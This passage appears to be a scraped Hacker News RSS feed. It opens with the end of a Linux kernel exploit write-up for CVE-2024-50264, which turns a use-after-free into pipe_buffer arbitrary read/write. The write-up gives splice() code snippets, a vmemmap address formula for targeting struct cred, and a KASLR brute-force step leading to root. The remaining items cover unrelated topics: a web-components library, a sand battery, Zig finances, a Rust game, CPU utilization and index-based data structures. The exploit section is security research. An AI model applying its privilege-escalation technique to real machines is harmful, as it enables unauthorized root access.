The original Dirty Pipe attack doesn't even need an infoleak and grants privilege escalation with a one-shot write. Impressed, I decided to experiment with pipe_buffer in my kernel-hack-drill.

Experimenting with the Dirty Pipe attack

First, I built a Dirty Pipe prototype in kernel-hack-drill; the PoC exploit drill_uaf_w_pipe_buffer.c is in the repository. It:

  performs a cross-cache attack and reclaims the slab that held drill_item_t objects as a slab for pipe_buffer objects
  exploits the UAF write to drill_item_t; the attacker-controlled bytes written to drill_item_t at offset 24, modify pipe_buffer.flags
  implements the Dirty Pipe attack, achieving LPE in one shot without an infoleak, cool!


To use this technique in my CVE-2024-50264 PoC exploit, I still had to bypass the last remaining Limitation #6: the kworker hangs before the UAF write if virtio_vsock_sock.tx_lock is non-zero. I managed to solve that by doing splice() from a regular file to the pipe, starting at offset zero:
	loff_t file_offset = 0;
	ssize_t bytes = 0;

	/* N.B. splice modifies the file_offset value */
	bytes = splice(temp_file_fd, &file_offset, pipe_fd[1], NULL, 1, 0);
	if (bytes < 0)
		err_exit("[-] splice");
	if (bytes != 1)
		err_exit("[-] splice short");


In that case, the pipe_buffer.offset field remains zero, so the kworker does not hang while acquiring the spinlock:




This seemed like a breakthrough – until I noticed that the UAF write also corrupted the pipe_buffer.ops function pointer by four zero bytes of peer_fwd_cnt. That unfortunate side effect provoked kernel crashes on every later operation involving pipe_buffer ☹️:




This brought me to the following line of reasoning:

  Completing the Dirty Pipe attack requires a working pipe_buffer with an unchanged ops pointer value.
  Preserving 0xffffffff in the most significant bytes of the pipe_buffer.ops function pointer requires that same value in peer_fwd_cnt.
  Setting peer_fwd_cnt in virtio_vsock_sock means sending data through the vsock.
  Sending data through a vsock first needs a successful connect().
  However, a successful connect() on the vulnerable vsock makes the UAF impossible ⛔.


Alas!

Pipe buffer entertainment

So the original Dirty Pipe technique wouldn't fit my CVE-2024-50264 PoC exploit. But suddenly an idea struck me:

  What if I create a pipe with capacity PAGE_SIZE * 4 forcing the kernel to allocate four pipe_buffer objects in kmalloc-192?


In that case, the memory object overlapping looked like this: four pipe_buffer objects in one kmalloc-192 slab are allocated at the place of two virtio_vsock_sock objects in two kmalloc-96 slabs. The following diagram illustrates the overlap:




Here, memory corruption can land on either of the two virtio_vsock_sock objects. I'll cover these cases one at a time.

To avoid the kernel hang and crash when the UAF hits virtio_vsock_sock #1, I used two tricks:

  Performed a splice() from a regular file to the pipe with a starting offset of zero. As mentioned earlier, this keeps the offset field of the first pipe_buffer at zero, so the kworker doesn't hang while acquiring the spinlock.
  Discarded that first pipe_buffer before triggering the UAF, leaving its offset field untouched:
     /* Remove the first pipe_buffer without changing the `pipe_buffer.offset` */
 bytes = splice(pipe_fd[0], NULL, temp_pipe_fd[1], NULL, 1, 0);
 if (bytes < 0)
 	err_exit("[-] splice");
 if (bytes == 0)
 	err_exit("[-] splice short");

 /*
  * Let's read this byte and empty the first pipe_buffer.
  * So if the UAF writing corrupts the first pipe_buffer,
  * that will not crash the kernel. Cool!
  */
 bytes = read(temp_pipe_fd[0], pipe_data_to_read, 1); /* 1 spliced byte */
 if (bytes < 0)
 	err_exit("[-] pipe read 1");
 if (bytes != 1)
 	err_exit("[-] pipe read 1 short");

    After this sequence of splice() and read(), the first pipe_buffer becomes inactive. Even if the subsequent UAF overwrites its ops pointer, later pipe operations won't dereference that corrupted pointer, so no kernel crash occurs.
  


I wanted to exploit the UAF on virtio_vsock_sock #2 to overwrite the fourth pipe_buffer. To prevent the kernel hang when the UAF hits this second virtio_vsock_sock, I called the same splice(temp_file_fd, &file_offset, pipe_fd[1], NULL, 1, 0) two more times. These syscalls initialized the second and third pipe_buffer objects, leaving their flags at zero, since this pipe operation doesn't set any PIPE_BUF_FLAG_* bits. Therefore, if the UAF occurs on the second virtio_vsock_sock, the spin_lock_bh() in virtio_transport_space_update() will not hang.

These preparations of the pipe opened a door for corrupting the page pointer of the fourth pipe_buffer:




kernel-hack-drill let me experiment with pipe_buffer objects. Without it, crafting this exploit primitive for the tricky CVE-2024-50264 would have been extremely hard.

AARW and KASLR's last revenge

In a pipe_buffer, the page pointer holds the address of a struct page inside the virtual memory map (vmemmap). vmemmap is an array of these structures that allows the kernel to address physical memory efficiently. It is mentioned in Documentation/arch/x86/x86_64/mm.rst:
____________________________________________________________|___________________________________________________________
                  |            |                  |         |
 ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
 ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
 ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
 ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
 ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
 ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
 ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
 ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
 ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
__________________|____________|__________________|_________|____________________________________________________________


Hence, when I managed to perform a UAF write of controlled data to the pipe_buffer.page pointer, I gained arbitrary address reading and writing (AARW) via the pipe. However, I wasn't able to change the AARW target address many times, as I mentioned in Limitation #5, so I had to choose the target in vmemmap carefully.

My first thought was to overwrite part of the kernel code. But with KASLR enabled, I didn't know the physical address of kernel _text and therefore couldn't determine its location inside vmemmap.

That's why I decided to use the pipe AARW against struct cred in the kernel heap. As I described earlier, I leaked the virtual address of cred using my msg_msg out-of-bounds read. This virtual address looked like 0xffff888003b7ad00, and I understood it was from the direct mapping of all physical memory. So I used the following formula to calculate the offset of the corresponding struct page in vmemmap:
#define STRUCT_PAGE_SZ 64lu
#define PAGE_ADDR_OFFSET(addr) (((addr & 0x3ffffffflu) >> 12) * STRUCT_PAGE_SZ)
uaf_val = PAGE_ADDR_OFFSET(cred_addr);


The idea behind it is simple:

  addr & 0x3ffffffflu gives the offset of the struct cred from the page_offset_base.
  Right shift by 12 gives the number of the memory page containing struct cred.
  Finally, multiplication by 64 (the size of struct page) gives the offset of the corresponding struct page in the vmemmap.


This formula should be adapted if the system has more than 4 GiB of RAM. In that case, ZONE_NORMAL containing kernel allocations usually starts at address 0x100000000. Hence, to calculate the offset of the needed struct page, we should add (0x100000000 >> 12) * STRUCT_PAGE_SZ.

Excellent, the described formula is independent of KASLR for physical addresses, so I could use it to calculate the four lower bytes of the target address for exploiting the pipe AARW against the struct cred. Why I needed only four lower bytes of pipe_buffer.page:

  My UAF write to peer_buf_alloc performed partial overwriting of the first half of the pipe_buffer.page pointer, as I showed at the diagram above.
  x86_64 is little-endian, so the first half of the pointer contains four lower bytes of the address.


But when I tried this approach, KASLR carried out its last revenge. It randomized the vmemmap_base address, and the four lower bytes of the struct page pointers carried two random bits. Ouch!

However, I decided to brute-force those two bits because I could achieve the UAF write around 5 times before the kworker got a null-ptr-deref after VSOCK_CLOSE_TIMEOUT (8 sec).




I found that probing different values of pipe_buffer.page from userspace works perfectly well:

  In case of fail, reading from the pipe simply returns Bad address.
  In case of success, reading from the pipe gives struct cred contents.


Great! I could finally determine a proper AARW target address, write to the pipe, overwrite euid and egid with 0, and get root. See the PoC exploit demo:


  



Conclusion

Bug collisions are painful. Finishing the research anyway is rewarding. Let me quote my good friend:




Working on this hard race condition with multiple limitations allowed me to discover new exploitation techniques and to use and improve my pet project kernel-hack-drill, which provides a testing environment for Linux kernel security researchers. You are welcome to try it and contribute.

Thanks for reading!

  


      ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Lit: a library for building fast, lightweight web components]]></title>
            <link>https://lit.dev</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45112720</guid>
            <description><![CDATA[Simple. Fast. Web Components.]]></description>
            <content:encoded><![CDATA[Simple. Fast. Web Components.SimpleSkip the boilerplateBuilding on top of the Web Components standards, Lit adds just what you need to be happy and productive: reactivity, declarative templates and a handful of thoughtful features to reduce boilerplate and make your job easier. Every Lit feature is carefully designed with web platform evolution in mind.FastTiny footprint, instant updatesWeighing in at around 5 KB (minified and compressed), Lit helps keep your bundle size small and your loading time short. And rendering is blazing fast, because Lit touches only the dynamic parts of your UI when updating — no need to rebuild a virtual tree and diff it with the DOM.Web ComponentsInteroperable & future-readyEvery Lit component is a native web component, with the superpower of interoperability. Web components work anywhere you use HTML, with any framework or none at all. This makes Lit ideal for building shareable components, design systems, or maintainable, future-ready sites and apps.import {html, css, LitElement} from 'lit';import {customElement, property} from 'lit/decorators.js';
@customElement('simple-greeting')export class SimpleGreeting extends LitElement {  static styles = css`p { color: blue }`;
  @property()  name = 'Somebody';
  render() {    return html`<p>Hello, ${this.name}!</p>`;  }}import {html, css, LitElement} from 'lit';
export class SimpleGreeting extends LitElement {  static styles = css`p { color: blue }`;
  static properties = {    name: {type: String},  };
  constructor() {    super();    this.name = 'Somebody';  }
  render() {    return html`<p>Hello, ${this.name}!</p>`;  }}customElements.define('simple-greeting', SimpleGreeting);<simple-greeting name="World"></simple-greeting>Edit this example in the Lit PlaygroundCustom ElementsLit components are standard custom elements, so the browser treats them exactly like built-in elements. Use them in hand-written HTML or framework code, output them from your CMS or static site builder, even create instances in JavaScript — they just work!Scoped stylesLit scopes your styles by default, using Shadow DOM. This keeps your CSS selectors simple and ensures that your component’s styles don't affect — and aren't affected by — any other styles on the page.Reactive propertiesDeclare reactive properties to model your component’s API and internal state. A Lit component efficiently re-renders whenever a reactive property (or corresponding HTML attribute) changes.Declarative templatesLit templates, based on tagged template literals, are simple, expressive and fast, featuring HTML markup with native JavaScript expressions inline. No custom syntax to learn, no compilation required.Build anything with LitNeed to deliver interactive content or features that drop into any site, built on any stack? Because they're natively supported by browsers, web components are the perfect solution — and Lit makes them easy to build.A design system helps you create experiences that are consistently excellent and on brand. But what if your organization uses multiple frameworks? With Lit, you can build one set of components that works for every team.Use Lit components to progressively enhance a static site, or build an entire app. By embracing Web Components, Lit minimizes lock-in and promotes maintainability: update or migrate one component at a time, without disrupting product development.Explore LitTry our live tutorials — no installation neededTutorialsConnect with Lit and the web components communityStay up to date with new releases, learn more about how to use web components and share projects and feedback with our team. All community participation is subject to Lit’s Code of Conduct — be excellent to each other!Lit Discord Chat about Lit with the Lit community and dev teamBluesky Stay up to date with the latest newsGitHub File issues, read the code, and make contributionsStack Overflow Ask and answer questions about Lit]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Finnish City Inaugurates 1 MW/100 MWh Sand Battery]]></title>
            <link>https://cleantechnica.com/2025/08/30/finnish-city-inaugurates-1-mw-100-mwh-sand-battery/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45112653</guid>
            <description><![CDATA[A 1 MW/100 MWh sand battery in now in operation in southern Finland where it is supporting the local district heating system.]]></description>
            <content:encoded><![CDATA[
	

Support CleanTechnica's work through a Substack subscription or on Stripe.

There are more ways to store energy than just using batteries. Some are using fire bricks, particularly for process heat for industries that rely on high heat in manufacturing. Others propose an arrangement of massive concrete blocks that move up and down like the weights of a giant grandfather clock, converting kinetic energy to potential energy and back again. In Finland, two intrepid engineers began experimenting with a sand battery a few years ago.
As we reported when the first prototype was unveiled three years ago, the idea of a sand battery began with two Finnish engineers, Markku Ylönen and Tommi Eronen. The concept is simplicity itself. Make a really big pile of sand. Heat it with excess renewable electricity to around 500°C (932°F), then use that heat later to heat homes, factories, even swimming pools. They say the sand can stay hot for 3 months or more. The pair have founded Polar Night Energy, which constructed a prototype consisting of 100 tons of sand inside what looks like a silo in the town of Kankaanpää.
Many Americans are unfamiliar with the concept of district heating, but it is widely used in other counties, especially in Scandinavia where keeping schools, municipal buildings, arenas, factories, and homes warm in winter is a challenge.
Loviisan Lämpö is a Finnish district heating company that supplies district heating to customers in Loviisa, Pukkila, Pornainen, and Pyhtää. It has collaborated with Polar Night on a new sand battery — one that is much larger than the prototype — which began operating in the city of Pornainen in southern Finland this month, where it is expected to reduce carbon emissions from district heating by 70 percent.
Previously, the majority of heat needed for the system came from burning oil, but that has now been completely eliminated. The system will continue to burn wood chips to supplement the sand battery. Wood chips are at least carbon neutral, although not an ideal solution since it takes years for trees to grow but only minutes for the chips to burn.
At the commissioning ceremony for the new battery, Mikko Paajanen, CEO of Loviisan Lämpö, said, “A couple of years ago, we started considering how to take district heating in Pornainen to the next level. It would have been easy to simply replace the old wood chip power plant with a new one of the same kind, but that didn’t align with our goals. We evaluated every possible alternative, and the Sand Battery proved to be the best option.”
The battery is a 42 foot tall, 50 foot wide steel cylinder filled with 2,000 tons of crushed stone. According to Fast Company, when extra renewable electricity is available, the system uses it to heat up the crushed stone, where it is stored until needed. Then the heat from the battery travels to other buildings through a system of pipes filled with hot water. Each building has its own equipment to distribute the heat to radiators, floor heaters, or other heating devices.
“We have already learnt that our system has even more potential than we initially calculated. It’s been a positive surprise,” said Ylönen after the prototype was placed in service. “Whenever there’s a high surge of available green electricity, we want to be able to get it into the storage really quickly.” The need to use energy more wisely was driven home for Finns after Russia stopped providing electricity, methane, and oil to Finland when it voted to join NATO. Finland and Russia share a common border.
Sand Battery Is Simple & Efficient
Credit: Polar Night
The sand battery is simplicity itself. “We just heat air and [circulate it] through sand,” says Liisa Naskali, COO of Polar Night Energy. But materials other than sand can be used. The new battery actually uses crushed soapstone chips from a local fireplace manufacturer. Sand, or other material crushed into sand-size particles, has the ability to store heat for weeks. Unlike some other batteries, the system doesn’t rely on chemicals, doesn’t degrade, and won’t catch on fire. In operation, the sand battery has demonstrated a round trip efficiency of 90 percent.
Inside the steel tank, a heat exchanger and a closed loop system are used to circulate the heat. Software runs heaters when electricity prices are low. So far this summer, the district heating operator has paid only about 10 percent of the average price of electricity because heating the system only occurred at optimal times. That helps make the technology cost competitive, although the initial installation cost is fairly high.
Polar Night is now in talks with other district heating companies and factory owners with a need for high temperature process heat. For the company, the project in Pornainen is a critical proof point. “This is really important for us because now we can show that this really works,” a spokesperson for Polar Night said.
Investment Opportunities
Polar Night and its partners see a bright financial future for sand batteries because they can participate in electricity reserve markets, reduce dependence on single energy sources in heat production, and serve as an excellent example of sector integration between electricity and heat.
“For us, the sand battery is a great commercial investment, but we also wanted to boldly support an innovative solution that benefits customers, the municipality, and the entire electricity market. This is a concrete example of a cost efficient and sustainable investment. If it works here, it will work anywhere,” said Sauli Antila, the investment director at CapMan Infra, the corporate owner of Loviisan Lämpö.
The profitability of the sand battery is based on charging it according to electricity prices and Fingrid’s reserve markets. Its large storage capacity enables balancing the electricity grid and optimizing consumption over several days or even weeks. The reserve market operations and optimization of the Pornainen Sand Battery are managed by the software unit division of Elisa Industriq.
“The Pornainen plant can be adjusted quickly and precisely, and it also has a remarkably long energy buffer, making it well suited for reserve market optimization. Our AI solution automatically identifies the best times to charge and discharge the Sand Battery and allocates flexibility capacity to the reserve products that need it most. Continuous optimization makes it a genuinely profitable investment,” explained Jukka-Pekka Salmenkaita, vice president of AI and special projects at Elisa Industriq.
Polar Night has a clear vision for the future. Construction of an electricity production pilot will begin in the coming weeks in Valkeakoski, Finland, and the company is in active negotiations for several large-scale thermal storage projects in district heating, hot air, and process steam production. “Industrial applications are particularly promising, especially where heat above 100°C is required, something electric boilers and heat pumps cannot provide,” said Polar Night COO Liisa Naskali.
This technology is never going to replace grid-scale battery storage, but could be useful in many situations where battery storage is not. A comment on the YouTube video below complained, “Not a word about return on investment in the presentation. That means it’ll never pay off. They just wasted taxpayers’ money to stroke their own egos.” MAGAlomaniacs are everywhere these days.




Sign up for CleanTechnica's Weekly Substack for Zach and Scott's in-depth analyses and high level summaries, sign up for our daily newsletter, and follow us on Google News!



Advertisement



 







Have a tip for CleanTechnica? Want to advertise? Want to suggest a guest for our CleanTech Talk podcast? Contact us here.

Sign up for our daily newsletter for 15 new cleantech stories a day. Or sign up for our weekly one on top stories of the week if daily is too frequent.

CleanTechnica uses affiliate links. See our policy here.CleanTechnica's Comment Policy



]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Comic Sans typeball designed to work with the IBM Selectric typewriters]]></title>
            <link>https://www.printables.com/model/441233-comic-sans-typeball-for-the-ibm-selectric-typewrit</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45111909</guid>
        </item>
        <item>
            <title><![CDATA[Zig Software Foundation 2025 Financial Report and Fundraiser]]></title>
            <link>https://ziglang.org/news/2025-financials/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45111405</guid>
            <description><![CDATA[← Back to
        News
        page]]></description>
            <content:encoded><![CDATA[
    
      
        ← Back to
        News
        page
      
    September 02, 2025
    
    


Previous YearZig Software Foundation is a 501(c)(3) non-profit organization which I am proud to say makes extremely efficient use of monetary resources. Unlike many of our peers, our primary expense is direct payments to contributors for their enhancements to the Zig project.Don’t take my word for it - let’s look at some numbers.2024 Expenditures




Expense Name
2024 Cost
Description

Contractors
$306,362.09
Direct compensation to contributors working on Zig at a rate of $60/hour.

Employees
$154,263.32
ZSF has one employee which is yours truly, Andrew Kelley, serving the role of 
Lead Software Engineer. In 2024, I also volunteered my time as President of Zig Software Foundation,
volunteered as Accounting Clerk, and volunteered as Development Director. In the future, it would be
nice to have dedicated staff for these roles so that I could focus more on being Lead Software Engineer.


Accounting
$18,463.62
This is entirely paying our accountant,
Strada Financial Group, to keep the American
legal system happy and keep our organization tax-exempt. I suspected we were being overcharged,
and in 2025 switched to a different accountant.


CI & Website
$14,986.73
Zig has great cross-compiling abilities in part
due to investing in testing infrastructure for different systems. Some of these costs were
one-time costs to purchase machines that sit in our homes and offices while others
are market-rate Hetzner bare metal machines that we run GitHub Actions on.


Taxes
$13,089.07
Although ZSF is a tax-exempt organization, employees are still required
to pay income tax.

Travel
$6,955.61
In a 2024 meeting, the board decided
that the previous year's travel budget successfully helped grow Zig adoption,
and retained the same budget of $15,000. In 2024, ZSF spent $6,956
of those allocated funds, increasing Zig's presence in Italy and Germany.


Sponsorships
$5,846.24
The Zig project is mostly comprised of in-house code, however,
it also relies on third party projects. Today, every Zig
installation includes some source files or ported code from
musl libc,
mingw-w64, and others.
ZSF donates money to these projects as a way to say thanks, give back to the ecosystem,
and increase the sustainability of Zig's dependencies.


Bank Fees
$782.23
This is a tiny slice of the pie, but every time ZSF
wires money, there is a transaction fee. Our contractors graciously bill
infrequently when possible to help reduce this cost.

Total Expenses
$520,748.91


Even with a 13% bigger budget, we still managed to spend 92% of our money in 2024 paying contributors for their time.Major Initiatives in 2024Zig 0.13.0 ReleasedZig 0.14.0 ReleasedGreatly expanded support for more targets that can be correctly cross-compiled and run on.Major language enhancementsMajor standard library enhancementsMajor build system enhancementsZig 0.14.1 released with bug fixes only.So far so good. You can see we’ve been hard at work spending our esteemed donors’ money on advancing the mission statement.However, if we look at the trend of donations over time for the year 2024, we see overall a slow decline. This is why we’re doing another fundraiser this year.2024-2025 Donations Per Month

The big spike is half of Mitchell Hashimoto’s pledge.More to the point, the second half will buy us another year to raise donations in order to keep our bank balance positive. ZSF neither borrows money nor invests money; we convert donations directly into progress on the Zig project.2024-2025 Cash On Hand

Meanwhile, user activity continues to skyrocket. A rapidly increasing user base is adding Zig to their software stacks, filing issues, sending pull requests, asking for help, and shipping software that depends on Zig.2024 GitHub Issues Per Month


The top line is Total Issues Opened and the bottom line is Total Issues Closed. The gap is widening -
more users are demanding more attention than Zig core team has time for.



Average time to close issues

All Time
7 months

Past Year
11 months

Past Month
over 1 year





Average time to close pull requests

All Time
16 days

Past Year
30 days

Past Month
2 months


Source: Repo TrendsTotal GitHub Stars

Source: OSS InsightIn response to this rising demand, we added Alex Rønne Petersen to the Zig core team. Thanks to the income that was available to us in 2024, we were able to offer new contracts.2024 Income




Income Name
2024 Amount
Description

GitHub Sponsors
$170,656.04
Zig on
GitHub Sponsors. This category contains a numerous amount of individuals
and companies - each less than $1000/month. We recommend those donating via
GitHub Sponsors to
switch to Every.org since they process receipts and are a non-profit organization themselves and are not in the process
of neglecting their core product in the face of the AI boom.


Mitchell Hashimoto
$150,000.00
A generous individual.
While his family's donation has helped ZSF immensely in 2024 and will continue to do so
in 2025, neither ZSF nor Mitchell
himself wants him to be this large a slice of the pie!



Every.org
$90,097.45

Every.org is a fellow 501(c)(3) non-profit that manages donation collecting for other non-profits.
They've been good to us; it's our preferred method of receiving donations. This category
is mostly individuals along with a few small donations from companies.



Bun
$60,000.00
Bun is a fast JavaScript all-in-one toolkit.


TigerBeetle
$60,000.00
TigerBeetle is a financial
transaction database with 1000x faster OLTP performance, mission critical safety, and indestructible
storage fault tolerance.



Benevity
$36,195.58
They help us collect company-matched donations from employees.
This category contains a number of individuals.


ZML
$33,000.00
ZML offers high performance inference on
any model for any hardware.


Mitchell Kember
$21,027.00
A generous individual.


Individuals
$19,312.52
This category contains many people who donated via paper checks
or other miscellaneous ways.


Russel Simmons
$16,384.00
A generous individual.


Blacksmith
$14,000.00
Blacksmith is
a dead simple, drop-in replacement that costs 75% less than GitHub
runners.


Total Income
$670,672.59


However, with our current level of recurring income, we will not be able to renew everyone’s contracts, nor offer new contracts to Zig core team members.A Plea for DonationsWe have extremely talented Zig core team members who want to renew their contracts, and others who are interested to start getting paid for their valuable work for the first time.In order to do this, we need more recurring donations. I for one do not enjoy asking for money, but in the interest of our users and contributors, it would be irresponsible not to.Please sign up for a monthly donation if you can. Our preferred donation method is via Every.org. A fellow 501(c)(3) non-profit, they seamlessly manage gift receipts, and are not pivoting to AI like GitHub is currently doing.

More details including our EIN and address for paper checks



CompaniesContact us to get your logo on ziglang.org in exchange for a monthly donation.

EmployeesCheck if your company matches donations to charities such as Zig Software Foundation. That 2x multiplier makes a huge difference. We're already in the system.

Venture CapitalistsWe are aware of a few startups betting on Zig as their language and toolchain of choice to build tomorrow's critical infrastructure. Helping the Zig Software Foundation reach v1.0 faster is one of the most efficient uses of capital you can make to boost your portfolio.

IndividualsCan you spare $10 per month? This is our favorite
kind of donation because it helps diversify ZSF's income, keeping us free from undue influence
from any single party. If not, don't sweat it. We'll be OK.


Huge thanks to all who graciously donate funds to our cause. Together we serve the users!-Andrew
  ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Show HN: LightCycle, a FOSS game in Rust based on Tron]]></title>
            <link>https://github.com/Tortured-Metaphor/LightCycle</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45110748</guid>
            <description><![CDATA[A Rust LightCycle Game. Contribute to Tortured-Metaphor/LightCycle development by creating an account on GitHub.]]></description>
            <content:encoded><![CDATA[LightCycle
A classic TRON-inspired light cycle game built with Rust and ggez.
Features

Single-player and Two-player modes - Battle against AI or a friend
Adjustable AI Difficulty - Easy, Medium, and Hard AI opponents
Boost Mechanic - Limited energy boost system for strategic gameplay
Visual Effects - Particle trails, screen shake, and glow effects
Pause Menu - Full pause functionality with in-game controls
Retro Aesthetic - 8-bit styled graphics with neon colors

Controls
Menu

1 - Start single-player game
2 - Start two-player game
D - Cycle AI difficulty (Easy/Medium/Hard)

Player 1

W/A/S/D - Movement
Left Shift - Boost

Player 2

Arrow Keys - Movement
Right Shift - Boost

General

P - Pause/Resume
ESC - Return to menu

Installation
Prerequisites

Rust (latest stable version)
Cargo

Building and Running
# Clone the repository
git clone https://github.com/Tortured-Metaphor/LightCycle.git
cd LightCycle

# Build the project
cargo build --release

# Run the game
cargo run --release
Gameplay
Navigate your light cycle around the arena, leaving a trail behind you. Avoid crashing into walls, your own trail, or your opponent's trail. The last cycle standing wins!
Use your boost strategically - it doubles your speed but drains energy quickly. Energy regenerates when not boosting.
AI Difficulty Levels

Easy: Shorter reaction time, makes mistakes more often
Medium: Balanced gameplay, moderate challenge
Hard: Advanced pathfinding, optimal decision making, aggressive boost usage

Development
Built with:

Rust - Systems programming language
ggez - Rust game framework

Version History

v0.2.0 - Added pause menu, boost mechanics, AI difficulties, visual effects
v0.1.0 - Initial game implementation

License
This project is open source and available under the MIT License.
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[%CPU utilization is a lie]]></title>
            <link>https://www.brendanlong.com/cpu-utilization-is-a-lie.html</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45110688</guid>
            <description><![CDATA[I deal with a lot of servers at work, and one thing everyone wants to know about their servers is how close they are to being at max utilization. It should be easy, right? Just pull up top or another system monitor tool, look at network, memory and CPU utilization …]]></description>
            <content:encoded><![CDATA[I deal with a lot of servers at work, and one thing everyone wants to know about their servers is how close they are to being at max utilization. It should be easy, right? Just pull up top or another system monitor tool, look at network, memory and CPU utilization, and whichever one is the highest tells you how close you are to the limits.For example, this machine is at 50% CPU utilization, so it can probably do twice as much of whatever it's doing.And yet, whenever people actually try to project these numbers, they find that CPU utilization doesn't quite increase linearly. But how bad could it possibly be?To answer this question, I ran a bunch of stress tests and monitored both how much work they did and what the system-reported CPU utilization was, then graphed the results.SetupFor my test machine, I used a desktop computer running Ubuntu with a Ryzen 9 5900X (12 core / 24 thread) processor. I also enabled Precision Boost Overdrive (i.e. Turbo).I vibe-coded a script that runs stress-ng in a loop, first using 24 workers and attempting to run them each at different utilizations from 1% to 100%, then using 1 to 24 workers all at 100% utilization. It used different stress testing method and measured the number of operations that could be completed ("Bogo ops1").The reason I did two different methods was that operating systems are smart about how they schedule work, and scheduling a small number of workers at 100% utilization can be done optimally (spoilers) but with 24 workers all at 50% utilization it's hard for the OS to do anything other than spreading the work evenly.ResultsYou can see the raw CSV results here.General CPUThe most basic test just runs all of stress-ng's CPU stress tests in a loop.You can see that when the system is reporting 50% CPU utilization, it's actually doing 60-65% of the actual maximum work it can do.64-bit Integer MathBut maybe that one was just a fluke. What if we just run some random math on 64-bit integers?This one is even worse! At "50% utilization", we're actually doing 65-85% of the max work we can get done. It can't possibly get worse than that though, right?Matrix MathSomething is definitely off. Doing matrix math, "50% utilization" is actually 80% to 100% of the max work that can be done.In case you were wondering about the system monitor screenshot from the start of the article, that was a matrix math test running with 12 workers, and you can see that it really did report 50% utilization even though additional workers do absolutely nothing (except make the utilization number go up).What's Going On?HyperthreadingYou might notice that this the graph keeps changing at 50%, and I've helpfully added piecewise linear regressions showing the fit.The main reason this is happening is hyperthreading: Half of the "cores" on this machine (and most machines) are sharing resources with other cores. If I run 12 workers on this machine, they each get scheduled on their own physical core with no shared resources, but once I go over that, each additional worker is sharing resources with another. In some cases (general CPU benchmarks), this makes things slightly worse, and in some cases (SIMD-heavy matrix math), there are no useful resources left to share.TurboIt's harder to see, but Turbo is also having an effect. This particular processor runs at 4.9 GHz at low utilization, but slowly drops to 4.3 GHz as more cores become active2.Note the zoomed-in y-axis. The clock speed "only" drops by 15% on this processor.Since CPU utilization is calculated as busy cycles / total cycles, this means the denominator is getting smaller as the numerator gets larger, so we get yet another reason why actual CPU utilization increases faster than linearly.Does This Matter?If you look at CPU utilization and assume it will increase linearly, you're going to have a rough time. If you're using the CPU efficiently (running above "50%" utilization), the reported utilization is an underestimate, sometimes significantly so.And keep in mind that I've only shown results for one processor, but hyperthreading performance and Turbo behavior can vary wildly between different processors, especially from different companies (AMD vs Intel).The best way I know to work around this is to run benchmarks and monitor actual work done:Benchmark how much work your server can do before having errors or unacceptable latency.Report how much work your server is currently doing.Compare those two metrics instead of CPU utilization.Bogo ops is presumably a reference to BogoMIPS, a "bogus" benchmark that Linux does at startup to very roughly understand CPU performance. ↩One of the main constraints processors operate under is needing to dissipate heat fast enough. When only one core is running, the processor can give that core some of the heat headroom that other cores aren't using and run it faster, but it can't do that all of the cores are running.Power usage works similarly and can be a constraint in some environments (usually not in a desktop computer, but frequently in servers). ↩]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Indices, not Pointers]]></title>
            <link>https://joegm.github.io/blog/indices-not-pointers/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45110386</guid>
            <description><![CDATA[Jul 15, 2025]]></description>
            <content:encoded><![CDATA[
      
      
  Jul 15, 2025
  Table of Contents
  


Smaller NodesFaster AccessLess Allocation OverheadInstant FreesA Downside - Freeing Single Nodes
FreelistsCode Example
  There is a pattern I’ve learned while using Zig which I’ve never seen used in any other language. It’s an extremely simple trick which - when applied to a data structure - reduces memory usage, reduces memory allocations, speeds up accesses, makes freeing instantaneous, and generally makes everything much, much faster. The trick is to use indices, not pointers.This is something I learned from a talk by Andrew Kelley (Zig’s creator) on data-oriented design. It’s used in Zig’s compiler to make very memory-efficient ASTs, and can be applied to pretty much any node-based data structure, usually trees.So what does this mean exactly? Well, to use indices means to store the nodes of the data structure in a dynamic array, appending new nodes instead of individually allocating them. Nodes can then reference each other via indices instead of pointers.
A comparison of memory layouts with different storage methodsPretty simple, right? But this strategy has some major performance benefits.Smaller NodesA pointer costs 8 bytes to store on a modern 64-bit system, but unless your planning on storing over 4 billion nodes in memory, an index can be stored in just 4 bytes.Faster AccessDue to the reduced node size and the fact that nodes are stored contiguously in memory, the data structure will fit into fewer memory pages and more nodes will fit in the cpu’s cache line, which generally improves access times significantly.Less Allocation OverheadThe way most people learn to implement data structures like trees is to make a separate allocation for each individual node, one at a time. This is a very naive way of allocating memory, however, as each memory allocation comes with a small but significant overhead which can really slow things down for a large number of nodes. Storing nodes in a growable arraylist minimizes this overhead as arraylists grow superlinearly (e.g, doubling in size each time more space is needed) meaning the majority of new nodes can just be placed in the next available slot without requesting more memory!
